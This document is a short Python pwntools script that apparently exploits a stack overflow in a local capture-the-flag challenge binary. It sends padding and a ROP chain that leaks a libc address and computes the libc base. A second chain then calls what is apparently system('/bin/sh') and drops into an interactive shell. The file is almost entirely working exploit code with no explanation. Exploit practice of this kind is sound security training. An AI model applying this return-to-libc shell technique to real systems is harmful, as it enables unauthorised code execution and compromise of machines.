from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/AngErza_challenges/8-demo/demo")
pwn.gdb.attach(p)
#p.recvuntil(b"Let's do it!")
payload = b"\x00" * 24
payload += p64(0x400416) + p64(0x400565) + p64(0x600ff0) + p64(0x400430) + p64(0x400565) + p64(0x601880) + p64(0x400440) + p64(0x4004c0) + p64(0x601878) + p64(0x4005d1)
payload += b"\n"
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x400565) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
payload += b"\n"
p.send(payload)
p.interactive()
